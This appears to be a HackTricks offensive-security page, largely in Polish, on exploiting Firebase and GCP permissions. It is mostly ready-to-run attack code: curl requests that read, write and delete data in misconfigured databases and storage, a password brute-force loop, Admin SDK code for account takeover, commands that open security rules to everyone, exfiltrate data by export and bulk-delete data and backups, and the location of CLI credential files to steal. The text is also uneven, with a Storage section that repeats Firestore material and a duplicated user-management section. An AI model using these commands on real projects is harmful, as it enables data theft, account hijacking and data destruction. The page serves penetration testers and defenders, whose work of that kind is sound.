# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Atakujący nie potrzebuje żadnych specjalnych uprawnień Firebase, aby przeprowadzić ten atak. Wystarczy, że w regułach bezpieczeństwa Firebase Realtime Database znajduje się podatna konfiguracja, w której reguły są ustawione na `.read: true` lub `.write: true`, umożliwiając publiczny odczyt lub zapis.

Atakujący musi zidentyfikować URL bazy danych, który zazwyczaj ma format: `https://<project-id>.firebaseio.com/`.

Ten URL można znaleźć poprzez inżynierię wsteczną aplikacji mobilnych (dekompilację APK Androida lub analizę aplikacji iOS), analizę plików konfiguracyjnych, takich jak google-services.json (Android) lub GoogleService-Info.plist (iOS), przeglądanie kodu źródłowego aplikacji webowych lub analizę ruchu sieciowego w celu zidentyfikowania żądań do domen `*.firebaseio.com`.

Atakujący znajduje URL bazy danych i sprawdza, czy jest publicznie dostępny, następnie uzyskuje dostęp do danych i może wprowadzić złośliwe informacje.

Najpierw sprawdzają, czy baza danych pozwala na odczyt, dopisując .json do URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Jeśli odpowiedź zawiera dane JSON lub null (zamiast "Permission Denied"), baza danych pozwala na odczyt. Aby sprawdzić dostęp do zapisu, atakujący może spróbować wysłać próbne żądanie zapisu przy użyciu Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Jeśli operacja powiedzie się, baza danych również umożliwia write access.


### Ujawnienie danych w Cloud Firestore
Atakujący nie potrzebuje żadnych specyficznych uprawnień Firebase, aby przeprowadzić ten atak. Wystarczy podatna konfiguracja w regułach bezpieczeństwa Cloud Firestore, w której reguły zezwalają na read or write access bez authentication lub przy niewystarczającej validation. Przykładem źle skonfigurowanej reguły, która nadaje pełny dostęp, jest:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ta reguła pozwala każdemu na odczyt i zapis wszystkich dokumentów bez żadnych ograniczeń. Reguły Firestore są szczegółowe i obowiązują dla poszczególnych kolekcji i dokumentów, więc błąd w konkretnej regule może ujawnić tylko niektóre kolekcje.

Atakujący musi zidentyfikować Firebase Project ID, który można znaleźć poprzez mobile app reverse engineering, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, inspecting the source code of web applications, lub analyzing network traffic w celu zidentyfikowania żądań do firestore.googleapis.com.
Firestore REST API używa formatu:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Jeśli reguły pozwalają na dostęp do odczytu bez uwierzytelnienia, atakujący może odczytywać kolekcje i dokumenty. Najpierw próbują uzyskać dostęp do konkretnej kolekcji:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Jeśli odpowiedź zawiera dokumenty JSON zamiast błędu uprawnień, kolekcja jest ujawniona. Atakujący może wyliczyć wszystkie dostępne kolekcje, próbując typowych nazw lub analizując strukturę aplikacji. Aby uzyskać dostęp do konkretnego dokumentu:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Jeśli reguły zezwalają na niezautoryzowany zapis lub mają niewystarczającą walidację, atakujący może tworzyć nowe dokumenty:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Aby zmodyfikować istniejący dokument, należy użyć PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Aby usunąć dokument i spowodować odmowę usługi:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Ujawnienie plików w Firebase Storage
Atakującemu nie są potrzebne żadne specyficzne uprawnienia Firebase, aby przeprowadzić ten atak. Wystarczy, że w regułach bezpieczeństwa Firebase Storage istnieje podatna konfiguracja, w której reguły zezwalają na dostęp do odczytu lub zapisu bez uwierzytelnienia lub z niewystarczającą walidacją. Reguły Storage kontrolują uprawnienia do odczytu i zapisu niezależnie, więc błąd w regule może ujawnić tylko dostęp do odczytu, tylko do zapisu, albo oba. Przykładem źle skonfigurowanej reguły, która przyznaje pełny dostęp, jest:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ta reguła zezwala na odczyt i zapis wszystkich dokumentów bez żadnych ograniczeń. Reguły Firestore są szczegółowe i stosowane na poziomie kolekcji i dokumentu, więc błąd w konkretnej regule może ujawnić tylko niektóre kolekcje. Atakujący musi zidentyfikować Firebase Project ID, który można znaleźć poprzez mobile application reverse engineering, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, inspekcję kodu źródłowego aplikacji webowej lub analizę ruchu sieciowego w celu zidentyfikowania żądań do firestore.googleapis.com.
Firestore REST API używa formatu: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Jeśli reguły pozwalają na nieautoryzowany dostęp do odczytu, atakujący może odczytać kolekcje i dokumenty. Najpierw próbuje uzyskać dostęp do konkretnej kolekcji.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Jeśli odpowiedź zawiera listę plików zamiast błędu uprawnień, plik jest ujawniony. Atakujący może zobaczyć zawartość plików, podając ich ścieżkę:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Jeżeli reguły zezwalają na zapis bez uwierzytelnienia lub mają niewystarczającą walidację, atakujący może przesłać złośliwe pliki. Aby przesłać plik przez REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Atakujący może przesłać code shells, malware payloads lub duże pliki, aby spowodować denial of service. Jeśli aplikacja przetwarza lub wykonuje przesłane pliki, atakujący może uzyskać remote code execution. Aby usunąć pliki i spowodować denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Wywoływanie publicznych Firebase Cloud Functions
Atakujący nie potrzebuje żadnych specjalnych uprawnień w Firebase, aby wykorzystać ten problem; wystarczy, że Cloud Function jest publicznie dostępna przez HTTP bez uwierzytelnienia.

Funkcja jest podatna, gdy jest nieprawidłowo skonfigurowana:

- Używa functions.https.onRequest, które nie wymusza uwierzytelnienia (w przeciwieństwie do onCall functions).
- Kod funkcji nie weryfikuje uwierzytelnienia użytkownika (np. brak sprawdzeń request.auth lub context.auth).
- Funkcja jest publicznie dostępna w IAM, co oznacza, że allUsers ma rolę roles/cloudfunctions.invoker. To jest domyślne zachowanie dla HTTP functions, chyba że deweloper ograniczy dostęp.

Firebase HTTP Cloud Functions są udostępniane pod adresami URL takimi jak:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Atakujący może odkryć te URL-e poprzez source code analysis, network traffic inspection, enumeration tools lub mobile app reverse engineering. Jeśli funkcja jest publicznie wystawiona i nie wymaga uwierzytelnienia, atakujący może ją wywołać bezpośrednio bez poświadczeń.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Jeśli funkcja nie waliduje poprawnie danych wejściowych, atakujący może spróbować innych ataków, takich jak code injection lub command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Aby przeprowadzić ten atak, atakujący nie potrzebuje żadnych specyficznych uprawnień w Firebase. Wystarczy, że Firebase API Key jest ujawniony w aplikacjach mobilnych lub webowych oraz że polityka haseł nie została skonfigurowana z surowszymi wymaganiami niż domyślne.

Atakujący musi zidentyfikować Firebase API Key, który można odnaleźć poprzez reverse engineering aplikacji mobilnej, analizę plików konfiguracyjnych takich jak google-services.json lub GoogleService-Info.plist, przeglądanie kodu źródłowego aplikacji webowych (np. w bootstrap.js) lub analizę ruchu sieciowego.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Jeśli Email Enumeration Protection jest wyłączona, odpowiedzi API mogą ujawniać, czy dany email istnieje w systemie (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), co pozwala atakującym na enumerację użytkowników przed próbami odgadywania haseł. Jeśli ta ochrona jest włączona, API zwraca ten sam komunikat błędu dla nieistniejących adresów email i nieprawidłowych haseł, uniemożliwiając enumerację użytkowników.

Ważne jest, że Firebase Authentication stosuje rate limiting, który może blokować żądania, jeśli zbyt wiele prób uwierzytelnienia nastąpi w krótkim czasie. Z tego powodu atakujący musiałby wprowadzać opóźnienia między próbami, aby uniknąć zablokowania przez rate limiting.

Atakujący identyfikuje API Key i wykonuje próby logowania z wieloma hasłami przeciwko znanym kontom. Jeśli Email Enumeration Protection jest wyłączona, atakujący może enumerować istniejących użytkowników, analizując odpowiedzi API:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Jeśli odpowiedź zawiera EMAIL_NOT_FOUND, e-mail nie istnieje w systemie. Jeśli zawiera INVALID_PASSWORD, e-mail istnieje, ale hasło jest nieprawidłowe, co potwierdza, że użytkownik jest zarejestrowany. Gdy zostanie zidentyfikowany prawidłowy użytkownik, atakujący może przeprowadzić brute-force. Ważne jest, aby wprowadzać przerwy między próbami, aby uniknąć mechanizmów rate-limiting w Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Przy domyślnej polityce haseł (minimum 6 znaków, brak wymagań dotyczących złożoności) atakujący może próbować wszystkich możliwych kombinacji haseł 6-znakowych, co stanowi stosunkowo małą przestrzeń poszukiwań w porównaniu do surowszych polityk haseł.

### Zarządzanie użytkownikami w Firebase Authentication

Aby przeprowadzić ten atak, atakujący potrzebuje określonych uprawnień Firebase Authentication. Wymagane uprawnienia to:

- `firebaseauth.users.create` do tworzenia użytkowników
- `firebaseauth.users.update` do modyfikowania istniejących użytkowników
- `firebaseauth.users.delete` do usuwania użytkowników
- `firebaseauth.users.get` do pobierania informacji o użytkownikach
- `firebaseauth.users.sendEmail` do wysyłania e-maili do użytkowników
- `firebaseauth.users.createSession` do tworzenia sesji użytkowników

Te uprawnienia są zawarte w roli `roles/firebaseauth.admin`, która przyznaje pełny dostęp do odczytu/zapisu do zasobów Firebase Authentication. Są one również uwzględnione w rolach wyższego poziomu, takich jak roles/firebase.developAdmin (który obejmuje wszystkie uprawnienia firebaseauth.*) oraz roles/firebase.admin (pełny dostęp do wszystkich usług Firebase).

Aby użyć Firebase Admin SDK, atakujący musiałby mieć dostęp do poświadczeń konta usługi (plik JSON), które mogą być znalezione na skompromitowanych systemach, publicznie ujawnionych repozytoriach kodu, skompromitowanych systemach CI/CD lub w wyniku przejęcia kont deweloperów mających dostęp do tych poświadczeń.

Pierwszym krokiem jest skonfigurowanie Firebase Admin SDK przy użyciu poświadczeń konta usługi.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Aby utworzyć złośliwego użytkownika przy użyciu adresu e-mail ofiary, atakujący spróbuje użyć Firebase Admin SDK, aby wygenerować nowe konto na ten adres.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Aby zmodyfikować istniejącego użytkownika, atakujący zaktualizowałby pola takie jak adres e-mail, status weryfikacji lub czy konto jest wyłączone.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Aby usunąć konto użytkownika i spowodować denial of service, atakujący wysłałby żądanie całkowitego usunięcia użytkownika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Atakujący może również uzyskać informacje o istniejących użytkownikach, żądając ich UID lub adresu e-mail.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Dodatkowo atakujący mógłby wygenerować linki weryfikacyjne lub linki do resetowania hasła, aby zmienić hasło i uzyskać dostęp do konta użytkownika.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Zarządzanie użytkownikami w Firebase Authentication
Atakujący potrzebuje konkretnych uprawnień Firebase Authentication, aby przeprowadzić ten atak. Wymagane uprawnienia to:

- `firebaseauth.users.create` — do tworzenia użytkowników
- `firebaseauth.users.update` — do modyfikacji istniejących użytkowników
- `firebaseauth.users.delete` — do usuwania użytkowników
- `firebaseauth.users.get` — do pobierania informacji o użytkowniku
- `firebaseauth.users.sendEmail` — do wysyłania e-maili do użytkowników
- `firebaseauth.users.createSession` — do tworzenia sesji użytkownika

Te uprawnienia są zawarte w roli roles/firebaseauth.admin, która przyznaje pełny dostęp do odczytu/zapisu do zasobów Firebase Authentication. Stanowią one także część ról wyższego poziomu, takich jak `roles/firebase.developAdmin` (która zawiera wszystkie uprawnienia firebaseauth.*) oraz `roles/firebase.admin` (pełny dostęp do wszystkich usług Firebase).

Aby użyć Firebase Admin SDK, atakujący musiałby mieć dostęp do poświadczeń konta serwisowego (plik JSON), które mogą być pozyskane z kompromitowanych systemów, publicznie udostępnionych repozytoriów kodu, kompromitowanych środowisk CI/CD lub poprzez przejęcie kont deweloperów mających dostęp do tych poświadczeń.

Pierwszym krokiem jest skonfigurowanie Firebase Admin SDK przy użyciu poświadczeń konta serwisowego.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Aby utworzyć złośliwy user wykorzystując victim’s email, attacker spróbuje założyć nowe user account z tym adresem, przypisując własny password oraz informacje profilowe.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Aby zmodyfikować istniejącego użytkownika, atakujący zmieniłby pola takie jak adres e-mail, status weryfikacji lub to, czy konto jest wyłączone.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Aby usunąć konto użytkownika — efektywnie powodując denial of service — atakujący wysłałby żądanie trwałego usunięcia tego użytkownika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Atakujący mógłby również uzyskać informacje o istniejących użytkownikach, takie jak ich UID lub email, żądając szczegółów użytkownika albo po UID, albo po adresie email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Dodatkowo atakujący może wygenerować linki weryfikacyjne lub linki do resetowania hasła, co umożliwi mu zmianę hasła użytkownika i przejęcie kontroli nad kontem.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modyfikacja reguł bezpieczeństwa w usługach Firebase
Atakujący potrzebuje określonych uprawnień, aby modyfikować reguły bezpieczeństwa w zależności od usługi. Dla Cloud Firestore i Firebase Cloud Storage wymagane są uprawnienia `firebaserules.rulesets.create` (do tworzenia rulesetów) oraz `firebaserules.releases.create` (do wdrażania releases). Te uprawnienia są zawarte w roli `roles/firebaserules.admin` lub w rolach wyższego poziomu, takich jak `roles/firebase.developAdmin` i `roles/firebase.admin`. Dla Firebase Realtime Database wymagane uprawnienie to `firebasedatabase.instances.update`.

Atakujący musi użyć Firebase REST API, aby zmodyfikować reguły bezpieczeństwa.
Najpierw atakujący musi uzyskać access token, używając service account credentials.
Aby uzyskać access token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Aby zmodyfikować reguły Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Aby zmodyfikować reguły Cloud Firestore, atakujący musi utworzyć ruleset, a następnie go wdrożyć:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Poprzednie polecenie zwraca nazwę ruleset w formacie projects/<project-id>/rulesets/<ruleset-id>. Aby wdrożyć nową wersję, release musi zostać zaktualizowany przy użyciu żądania PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Aby zmodyfikować reguły Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Poprzednie polecenie zwraca nazwę rulesetu w formacie projects/<project-id>/rulesets/<ruleset-id>. Aby wdrożyć nową wersję, release musi zostać zaktualizowany przy użyciu żądania PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore używa tej samej infrastruktury i systemu uprawnień co Cloud Datastore, więc uprawnienia Datastore IAM mają bezpośrednie zastosowanie do Firestore. Aby modyfikować polityki TTL, wymagane jest uprawnienie `datastore.indexes.update`. Aby eksportować dane, wymagane jest uprawnienie `datastore.databases.export`. Aby importować dane, wymagane jest uprawnienie datastore.databases.import. Aby wykonać masowe usuwanie danych, wymagane jest uprawnienie `datastore.databases.bulkDelete`.

Do operacji tworzenia kopii zapasowych i przywracania potrzebne są konkretne uprawnienia:

- `datastore.backups.get` i `datastore.backups.list` do listowania i pobierania szczegółów dostępnych kopii zapasowych
- `datastore.backups.delete` do usuwania kopii zapasowych
- `datastore.backups.restoreDatabase` do przywracania bazy danych z kopii zapasowej
- `datastore.backupSchedules.create` i `datastore.backupSchedules.delete` do zarządzania harmonogramami kopii zapasowych

Kiedy tworzona jest polityka TTL, wybierana jest wskazana właściwość, która identyfikuje encje kwalifikujące się do usunięcia. Właściwość TTL musi być typu Date and time. Atakujący może wybrać właściwość, która już istnieje, lub wskazać właściwość, którą planuje dodać później. Jeśli wartość pola jest datą z przeszłości, dokument staje się kwalifikujący się do natychmiastowego usunięcia. Atakujący może użyć gcloud CLI do manipulowania politykami TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Aby wyeksportować dane i przeprowadzić ich egzfiltrację, atakujący może użyć gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Aby zaimportować złośliwe dane:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Aby przeprowadzić masowe usunięcie danych i spowodować denial of service, atakujący może użyć gcloud Firestore bulk-delete tool, aby usunąć całe kolekcje.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
W operacjach związanych z backupem i przywracaniem atakujący może tworzyć scheduled backups, aby uchwycić bieżący stan bazy danych, listować istniejące backups, przywracać (restore) z backupu w celu nadpisania ostatnich zmian, usuwać backups powodując trwałą utratę danych oraz usuwać scheduled backups.
Aby utworzyć codzienny harmonogram scheduled backups, który natychmiast wygeneruje backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Aby przywrócić z konkretnej kopii zapasowej, atakujący może utworzyć nową bazę danych, korzystając z danych zawartych w tej kopii. Operacja przywracania zapisuje dane kopii zapasowej w nowej bazie danych, co oznacza, że istniejący DATABASE_ID nie może być użyty.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Aby usunąć kopię zapasową i spowodować trwałą utratę danych:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Kradzież i nadużycie poświadczeń Firebase CLI
Atakujący nie potrzebuje specjalnych uprawnień Firebase, aby przeprowadzić ten atak, ale musi mieć dostęp do lokalnego systemu dewelopera lub do pliku poświadczeń Firebase CLI. Te poświadczenia są przechowywane w pliku JSON znajdującym się w:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Plik ten zawiera tokeny uwierzytelniające, w tym refresh_token i access_token, które pozwalają atakującemu uwierzytelnić się jako użytkownik, który pierwotnie uruchomił firebase login.

Atakujący uzyskuje dostęp do pliku poświadczeń Firebase CLI. Może skopiować cały plik na swój system, a Firebase CLI automatycznie użyje poświadczeń z domyślnej lokalizacji. Po wykonaniu tej czynności atakujący może zobaczyć wszystkie projekty Firebase dostępne dla tego użytkownika.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
